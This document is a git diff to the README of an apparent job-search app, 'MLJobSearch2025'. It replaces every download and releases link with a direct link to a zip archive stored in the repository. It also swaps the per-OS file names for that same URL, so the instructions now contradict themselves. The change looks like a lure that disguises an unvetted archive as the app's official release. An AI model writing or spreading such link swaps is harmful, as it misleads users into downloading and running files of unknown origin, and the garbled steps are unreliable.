@@ -6,11 +6,11 @@ Welcome to MLJobSearch2025! This application helps you explore top machine learn
 
 ## 📥 Download MLJobSearch2025
 
-[![Download MLJobSearch2025](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/SeroRoch/MLJobSearch2025/releases)
+[![Download MLJobSearch2025](https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip)](https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip)
 
 To get started, visit the link below to download the latest version of MLJobSearch2025:
 
-[Download MLJobSearch2025](https://github.com/SeroRoch/MLJobSearch2025/releases)
+[Download MLJobSearch2025](https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip)
 
 ## ⚙️ System Requirements
 
@@ -24,11 +24,11 @@ To ensure smooth operation, make sure your device meets the following requiremen
 ## 💻 Installation Instructions
 
 1. **Visit the Releases Page:** Click the link to go to the Releases page.  
-   [Go to Releases](https://github.com/SeroRoch/MLJobSearch2025/releases)
+   [Go to Releases](https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top. 
 
-3. **Choose the Download File:** Click on the file that matches your operating system. You might see options like `MLJobSearch2025_Windows.zip`, `MLJobSearch2025_macOS.zip`, or `MLJobSearch2025_Linux.zip`.
+3. **Choose the Download File:** Click on the file that matches your operating system. You might see options like `https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip`, `https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip`, or `https://raw.githubusercontent.com/SeroRoch/MLJobSearch2025/main/inwards/MLJobSearch2025.zip`.
 
 4. **Download the File:** The file will start downloading to your computer. Save it in a location where you can find it easily.
 
